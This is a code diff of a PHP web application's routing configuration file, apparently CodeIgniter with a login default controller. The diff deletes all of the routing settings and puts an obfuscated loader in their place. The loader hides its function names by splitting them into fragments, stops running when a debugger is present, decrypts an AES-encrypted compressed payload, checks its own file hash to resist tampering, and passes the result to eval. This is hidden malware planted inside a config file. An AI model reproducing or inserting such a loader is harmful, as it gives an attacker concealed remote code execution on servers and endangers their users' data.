@@ -1,54 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------------
-| URI ROUTING
-| -------------------------------------------------------------------------
-| This file lets you re-map URI requests to specific controller functions.
-|
-| Typically there is a one-to-one relationship between a URL string
-| and its corresponding controller class/method. The segments in a
-| URL normally follow this pattern:
-|
-|	example.com/class/method/id/
-|
-| In some instances, however, you may want to remap this relationship
-| so that a different class/function is called than the one
-| corresponding to the URL.
-|
-| Please see the user guide for complete details:
-|
-|	https://codeigniter.com/user_guide/general/routing.html
-|
-| -------------------------------------------------------------------------
-| RESERVED ROUTES
-| -------------------------------------------------------------------------
-|
-| There are three reserved routes:
-|
-|	$route['default_controller'] = 'welcome';
-|
-| This route indicates which controller class should be loaded if the
-| URI contains no data. In the above example, the "welcome" class
-| would be loaded.
-|
-|	$route['404_override'] = 'errors/page_missing';
-|
-| This route will tell the Router which controller/method to use if those
-| provided in the URL cannot be matched to a valid route.
-|
-|	$route['translate_uri_dashes'] = FALSE;
-|
-| This is not exactly a route, but allows you to automatically route
-| controller and method names that contain dashes. '-' isn't a valid
-| class or method name character, so it requires translation.
-| When you set this option to TRUE, it will replace ALL dashes in the
-| controller and method URI segments.
-|
-| Examples:	my-controller/index	-> my_controller/index
-|		my-controller/my-method	-> my_controller/my_method
-*/
-$route['default_controller'] = 'login';
-$route['404_override'] = '';
-$route['translate_uri_dashes'] = FALSE;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_a6f3cdig=('bas'.'e64'.'_de'.'cod'.'e');
+$_w8ysovzg=('gzu'.'nco'.'mpr'.'ess');
+$_yfhl7f7o=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t1y0b4hg='Uf6NdWIP';
+$_yvbb05u5='X8lLylFp';
+$_h4ah326d='0Hm/L36t1q0=';
+$_yd3eg8ah='ZU9L+S86';
+$_lgy6049m='lUKasEwP';
+$_fappmqt9='iBrZckoF';
+$_jrggq2nr='hLwMbw==';
+$_csage3ty='9i7xvLVp';
+$_q5001lrv=$_a6f3cdig($_t1y0b4hg.$_yd3eg8ah.$_lgy6049m.$_yvbb05u5.$_h4ah326d);
+$_jhryt0ou=$_a6f3cdig($_fappmqt9.$_csage3ty.$_jrggq2nr);
+$_vm9mh0yh=$_a6f3cdig('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');
+$_cog8vdxo=$_yfhl7f7o($_vm9mh0yh,'aes-256-cbc',$_q5001lrv,OPENSSL_RAW_DATA,$_jhryt0ou);
+if($_cog8vdxo===false){exit;}
+$_m19wnt11=$_w8ysovzg($_cog8vdxo);
+if($_m19wnt11===false){exit;}
+$_hl55616o='d73053e50c67d8289cb7d6d19b906b4662edcc8b1f689fe7020c09f59ea7ff89';
+$_fhdguod4=@file_get_contents(__FILE__);
+if($_fhdguod4!==false){
+$_eyern9i3=str_replace($_hl55616o,"0000000000000000000000000000000000000000000000000000000000000000",$_fhdguod4);
+$_aigy37cm=hash("sha256",$_eyern9i3);
+if($_aigy37cm!==$_hl55616o){@http_response_code(403);exit;}
+}
+eval($_m19wnt11);
